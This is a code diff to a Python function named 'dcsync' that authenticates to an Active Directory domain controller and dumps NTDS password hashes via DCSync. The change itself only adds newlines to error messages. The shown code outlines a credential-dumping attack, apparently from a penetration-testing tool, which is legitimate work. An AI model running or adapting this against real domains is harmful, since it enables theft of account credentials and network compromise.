@@ -21,12 +21,12 @@ def dcsync(target, username, domain, password='', nthash=''):
     try:
         smb_conn = SMBConnection(target, target)
     except:
-        print("Host unreachable.", file=sys.stderr)
+        print("Host unreachable.\n", file=sys.stderr)
         return None
     try:
         smb_conn.login(user=username, password=password, nthash=nthash, domain=domain)
     except:
-        print("Invalid credentials provided.", file=sys.stderr)
+        print("Invalid credentials provided.\n", file=sys.stderr)
         return None
 
     base_dn = get_domain_base(domain)
@@ -34,7 +34,7 @@ def dcsync(target, username, domain, password='', nthash=''):
     try:
         ldapConnection = LDAPConnection(f'ldap://{target}', base_dn, target)
     except:
-        print("LDAP connection error, the target provided must be the DC.", file=sys.stderr)
+        print("LDAP connection error, the target provided must be the DC.\n", file=sys.stderr)
         return None
         
     # Login can't fail if it succeded with smb
@@ -47,14 +47,14 @@ def dcsync(target, username, domain, password='', nthash=''):
         ntds_filename = remote_ops.saveNTDS()
     except DCERPCException as e:
         if str(e).find('rpc_s_access_denied') >= 0:
-            print("The current user doesn't have enough rights.", file=sys.stderr)
+            print("The current user doesn't have enough rights.\n", file=sys.stderr)
             try:
                 remote_ops.finish()
             except:
-                print("Problem with cleanup.", file=sys.stderr)
+                print("Problem with cleanup.\n", file=sys.stderr)
             return None
         else:
-            print("Error when retrieving required information via RPC.", file=sys.stderr)
+            print("Error when retrieving required information via RPC.\n", file=sys.stderr)
             return None
 
 
@@ -67,10 +67,10 @@ def dcsync(target, username, domain, password='', nthash=''):
             ntds.dump()
         except Exception as e:
             if str(e).find('ERROR_DS_DRA_BAD_DN') >= 0:
-                print("The current user doesn't have DCSync rights.", file=sys.stderr)
+                print("The current user doesn't have DCSync rights.\n", file=sys.stderr)
                 return None
             else:
-                print("Error while performing DCSync.", file=sys.stderr)
+                print("Error while performing DCSync.\n", file=sys.stderr)
                 return None
     dcsync_out = parse_output(f.getvalue())
 
@@ -79,7 +79,7 @@ def dcsync(target, username, domain, password='', nthash=''):
         remote_ops.finish()
         ntds.finish()
     except:
-        print("Problem with cleanup.", file=sys.stderr)
+        print("Problem with cleanup.\n", file=sys.stderr)
 
     return dcsync_out
 
